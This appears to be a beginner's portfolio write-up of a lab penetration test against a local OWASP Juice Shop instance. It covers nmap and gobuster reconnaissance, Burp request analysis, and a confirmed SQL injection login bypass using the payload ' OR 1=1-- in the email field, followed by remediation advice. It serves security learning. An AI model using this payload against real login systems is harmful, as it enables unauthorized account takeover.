# Web Application VAPT Assessment — OWASP Juice Shop

A beginner-level Web Application Vulnerability Assessment and Penetration Testing (VAPT) project performed against a locally hosted instance of OWASP Juice Shop, conducted for learning and portfolio purposes in a fully controlled lab environment.

## Overview

This project documents a hands-on security assessment of OWASP Juice Shop, an intentionally vulnerable web application maintained by OWASP for security training. The assessment was carried out entirely on a local Docker instance of the application, with no external or production systems involved.

The goal of this project was to practice a structured VAPT workflow — reconnaissance, enumeration, request analysis, authentication testing, and vulnerability validation — and to document the process the way it would be documented in a professional engagement.

## Objectives

- Practice a structured web application testing methodology
- Identify and validate a real vulnerability in a legal, controlled environment
- Produce clear, evidence-based documentation of the finding
- Build a portfolio project demonstrating foundational web application security skills

## Target

- **Application:** OWASP Juice Shop
- **Target URL:** `http://127.0.0.1:3000`
- **Hosting:** Local Docker container

## Scope

Testing was limited to the locally hosted OWASP Juice Shop instance only. No other hosts, networks, or third-party systems were tested. This assessment was performed for educational purposes in a private lab and was not conducted against any live or production system.

## Testing Environment

- **Attacking machine:** Kali Linux
- **Target:** OWASP Juice Shop (Docker container)
- **Network:** Local, isolated virtual lab

## Methodology

The assessment followed a structured approach:

1. Reconnaissance
2. Enumeration
3. Web application request analysis
4. Authentication testing
5. Vulnerability validation
6. Evidence collection
7. Impact assessment
8. Remediation recommendations

## Tools Used

- **Nmap** — port and service discovery
- **Gobuster** — directory/content enumeration
- **Burp Suite** — HTTP request/response inspection and manipulation
- **Kali Linux** — testing platform
- **Docker** — local hosting of the target application

## Reconnaissance

An Nmap scan was run against the target to identify open ports and services:

```
nmap -sV -p 3000 127.0.0.1
```

Port 3000 was found open. Nmap's service-version detection did not return a recognized service label for the port, but the HTTP response returned by the application contained the page title `OWASP Juice Shop`, confirming that the target application was reachable and running on this port.

Raw output is saved in [`reconnaissance/nmap-basic.txt`](reconnaissance/nmap-basic.txt) and [`reconnaissance/nmap-service-version.txt`](reconnaissance/nmap-service-version.txt).

## Enumeration

Directory enumeration was performed using Gobuster with a common wordlist:

```
gobuster dir -u http://127.0.0.1:3000 -w /usr/share/wordlists/dirb/common.txt
```

Results are saved in [`enumeration/gobuster.txt`](enumeration/gobuster.txt).

## Web Application Testing

Burp Suite was used to intercept and inspect HTTP traffic between the browser and the application. As an example, the API request below was captured and replayed with a modified parameter using Burp Repeater:

```
GET /api/Challenges/?name=Score%20Board
```

Modified to:

```
GET /api/Challenges/?name=test
```

This returned `HTTP/1.1 200 OK` with an empty result set, which was normal, expected application behavior and was not treated as a vulnerability.

## Confirmed Vulnerability: SQL Injection → Authentication Bypass

**Severity:** Critical
**Endpoint:** `POST /rest/user/login`
**Parameter:** `email`

### Baseline Test

A normal login attempt was sent:

```json
{
  "email": "test@test.com",
  "password": "test"
}
```

Result: `HTTP/1.1 401 Unauthorized` — "Invalid email or password." This confirmed normal authentication behavior.

### Error-Based Test

The `email` field was modified to include a single quote:

```json
{
  "email": "'",
  "password": "test"
}
```

Result: `HTTP/1.1 500 Internal Server Error`, with a SQLite database error and internal stack trace exposed in the response. This indicated unsafe handling of user input in a SQL query and information disclosure, but did not by itself prove an authentication bypass.

### Authentication Bypass Validation

The `email` field was then modified using a classic SQL injection payload:

```json
{
  "email": "' OR 1=1--",
  "password": "test"
}
```

Result: `HTTP/1.1 200 OK`, with an authentication token returned for the account `admin@juice-sh.op`. The application authenticated the request as an administrative account without valid credentials.

**Authentication token in evidence is always shown as `[REDACTED]`.**

Full details are documented in [`findings/01-sql-injection-authentication-bypass.md`](findings/01-sql-injection-authentication-bypass.md).

## Evidence

Screenshots referenced in the findings and report are stored in [`screenshots/`](screenshots/):

| File | Description |
|---|---|
| `01-juice-shop-homepage.png` | OWASP Juice Shop target application |
| `02-nmap-basic-discovery.png` | Basic Nmap reconnaissance |
| `03-nmap-service-detection.png` | Nmap service/version detection |
| `04-gobuster-enumeration.png` | Gobuster directory enumeration |
| `05-burp-initial-request.png` | Initial HTTP request captured using Burp Suite |
| `06-burp-api-request-response.png` | API request and response analysis |
| `07-normal-login-request-response.png` | Baseline authentication request and response |
| `08-sql-injection-error.png` | SQL injection error and database error disclosure |
| `09-sqli-authentication-bypass.png` | Confirmed SQL injection authentication bypass |
## Impact

An attacker able to exploit this SQL injection vulnerability could bypass authentication entirely and gain unauthorized access to user accounts, including accounts with administrative privileges, without knowing valid credentials. This could lead to full compromise of the application's user data and administrative functions.

## Remediation

- Use parameterized queries / prepared statements for all database access.
- Never concatenate user-controlled input directly into SQL statements.
- Validate and sanitize all user input server-side.
- Return generic, non-descriptive error messages to end users.
- Avoid exposing database errors or stack traces in application responses.
- Follow secure coding practices for database access throughout the application.

## Security Considerations

All testing was performed against a local, intentionally vulnerable training application (OWASP Juice Shop) running in an isolated Docker environment. No production systems, third-party services, or real user data were involved at any point.

## Limitations

- This assessment covered a limited set of tests and did not constitute a full, exhaustive penetration test.
- Testing was manual and scoped to demonstrating understanding of core VAPT concepts rather than achieving full application coverage.
- This project was completed as a learning exercise and reflects an entry-level skill set.

## Conclusion

This project demonstrates the practical application of a basic VAPT methodology against a deliberately vulnerable web application. A critical SQL injection vulnerability leading to authentication bypass was identified, validated, and documented following an evidence-based, professional reporting approach.

## Disclaimer

This assessment was performed exclusively against a locally hosted, intentionally vulnerable training application (OWASP Juice Shop) for educational purposes. No unauthorized testing was performed against any third-party, live, or production system. This project is intended solely to demonstrate learning and skill development in web application security.
